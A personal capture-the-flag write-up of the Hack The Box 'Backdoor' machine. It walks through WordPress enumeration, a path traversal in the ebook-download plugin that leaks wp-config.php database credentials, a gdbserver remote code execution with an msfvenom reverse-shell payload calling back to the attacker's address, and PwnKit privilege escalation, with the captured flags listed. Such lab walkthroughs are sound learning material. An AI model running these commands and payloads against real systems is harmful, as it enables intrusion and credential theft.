# Enumeration
## nmap
`nmap -sV -A -v 10.10.11.125`
![[Screenshot 2022-04-26 at 17.07.17.png]]

## gobuster
`gobuster dir -u http://backdoor.htb/ -x php,txt,html,bak,zip -e -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
![[Screenshot 2022-04-27 at 15.00.52.png]]
+ _http://backdoor.htb/server-status        (Status: 403) [Size: 277]_

## wpscan 
### ernumeration
`wpscan --url 10.10.11.125 --enumerate`
![[Screenshot 2022-04-26 at 17.37.05.png]]
![[Screenshot 2022-04-26 at 17.38.07.png]]
![[Screenshot 2022-04-26 at 17.38.46.png]]
### plugins
`wpscan --url http://backdoor.htb/ --enumerate p,u --plugins-detection aggressive`
the _p_ and _u_ after _--enumerate_ is for enumerating plugins and users specifically.
![[Screenshot 2022-04-27 at 15.07.24.png]]
![[Screenshot 2022-04-27 at 15.07.41.png]]
The part to focus on is the _akismet_ plugin.
Looking it up, it appears it is vulnerable to XSS!

# Foothold
Looking around on the website there are a couple pages _contact_, _blog_, _about_ and homepage
![[Screenshot 2022-04-26 at 17.35.58.png]]

Going to _ http://backdoor.htb/wp-admin _ shows the admin login page. It was confirmed by the _wpscan_ that there is a user admin. (deadend)

## searchsploit
`searchsploit wordpress 5.3` resulted in some exploits, but mainly DOS ones, which are not very helpful. However, there might be some plugins used with vulnerabilities.
![[Screenshot 2022-04-27 at 11.50.27.png]]

## website
Visiting http://backdoor.htb/wp-content/plugins/ shows the plugins used
![[Screenshot 2022-04-27 at 15.51.27.png]]
_hello.php_ is empty, but the ebook is interesting. The readme withing the ebook_upload directory shows that there is very little restriction to what can be done in terms of uploading files, etc.
Looking through the files I found some images and other files:
- franta@masd.cz
- ebookdownloads/ahoj-2![[Screenshot 2022-04-27 at 15.55.55.png]]
- ebookdownload.php + filedownload.php --> lfi/rce in URL?
 
# Exploit
Looking into the ebook plugin, I found an [exploit](https://www.exploit-db.com/exploits/39575) which allows for directory traversal in the URL.
So I entered `http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php` in the URL and got the file.
![[Screenshot 2022-04-28 at 10.53.22.png]]
Looks like we got the credentials for a MySQL DB _wordpress_ --> _wordpressuser:MQYBJSaD#DxG6qbm_
Logging in with the credentials did not work, so rather trying the LFI through burp with an intrusion attack using `/home/kali/tools/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt`. Turns out not using the path traversal and only using _/etc/passwd_ showed the user file:
![[Screenshot 2022-04-28 at 11.10.21.png]]
**All deadends**

## port 1337 - waste
Looking up some help, I found that another nmap scan of higher ports was necessary, and got the port _1337_:
![[Screenshot 2022-04-28 at 11.27.31.png]]
Looking it up, this is the port where its possible to [create a backdoor]()

### searchsploit
Doing a quick searchsploit it appears there are alot of shellcodes for this port
![[Screenshot 2022-04-28 at 11.54.28.png]], so I proceed to look into them.

## processes
There is apparently something else interesting in the processes running on my machine:
![[Screenshot 2022-04-28 at 11.38.22.png]]![[Screenshot 2022-04-28 at 11.38.53.png]]
The _self_ process is inked to another process _257460_. `ls -l /proc/self` shows
![[Screenshot 2022-04-28 at 11.42.15.png]].
Trying `cat /proc/self/cmdline` returns
![[Screenshot 2022-04-28 at 11.43.59.png]], which oddly enough there is no space between _cat_ and the file. `curl -s http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/self/cmdline -o-` shows that there is an apache2-k server running? 
![[Screenshot 2022-04-28 at 11.47.56.png]] Breaking it down it appears it is `/usr/sbin/apache2 -k start`.

==========
**Finding the right process shows gdbserver running which is where the exploit can be executed!** How to:
1. `http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/sched_debug`
![[Screenshot 2022-04-28 at 12.55.24.png]]
2. Go to `http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/31302` to double check
3. [helpful](https://www.youtube.com/watch?v=eAuUIT3I2II)
==========
## msfconsole
Using the [gdbserver exploit](https://www.exploit-db.com/exploits/50539) but in metasploit so the `multi/gdb/gdb_server_exec`, and setting all the options right + **changing** the paylaod from x86 to x64 architecture, before running it generated a session, which I then turned into a shell using python:
![[Screenshot 2022-04-28 at 12.09.12.png]]
![[Screenshot 2022-04-28 at 12.10.15.png]]
And I got the user flag.

## non-msfconsole
Downloaded the [exploit](https://www.exploit-db.com/exploits/50539)
Created the payload using `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.14 LPORT=4444 PrependFork=true -o rev.bin`. Set up a liste!ner and ran the exploit `python3 50539.py 10.10.11.125:1337 rev.bin`:
[[Screenshot 2022-04-28 at 12.31.53.png]]
![[Screenshot 2022-04-28 at 12.31.26.png]]
(using the payload created with `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.14 LPORT=4444 -o elf` did not work as im it did not establish a proper session after connecting.)
# Privesc
I imported linpeas and decided to have a look around. It appears linpeas found the system is vulnerable to `CVE-2021-4034` which is _pwnkit_ aka something I have done before. Taking the easy path first I tried importing and running _PwnKit_ and we got a root shell + the flag.


# Other Privesc metods
![[Screenshot 2022-04-28 at 12.24.16.png]]

===================

# Flags
8d112e9afa0224d1fe7242fd821b4824
2177ae87968206f1a1ad7db3f50c1520
# Thoughts
- wordpress 5.8.1
- https://www.wordfence.com/blog/2021/03/medium-severity-vulnerability-patched-in-user-profile-picture-plugin/
- ebook plugin --> uploading exploit?
# New Things Learnt
- wpscan (~ish)
- [XML-RPC](http://xmlrpc.com/)
- go to /wp-content/plugins
- more thorough nmap scans!
- [gdbserver](https://sourceware.org/gdb/onlinedocs/gdb/Server.html)
- screen --> sortof multiple terminals/vms running simultaneously with different purposes/processes, so the user can be changed from one of the currently active ones to another
![[Screenshot 2022-04-29 at 14.15.41.png]]
The _cleaned process_ `root         803  0.0  0.0   2608  1676 ?        Ss   09:53   0:01      _ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done`
1. more thorough enumerations(nmap) scans
2. worpress plugins
3. LFI
4. processes
5. gdbserver exploit
6. 2 privescs = CVE / [screen](https://www.kali.org/tools/screen/)


# Useful writeups for further reading
- https://0xdf.gitlab.io/2022/04/23/htb-backdoor.html#process-enumeration
- https://medium.com/@bocahganteng/write-up-backdoor-htb-c0092079ef2c
- 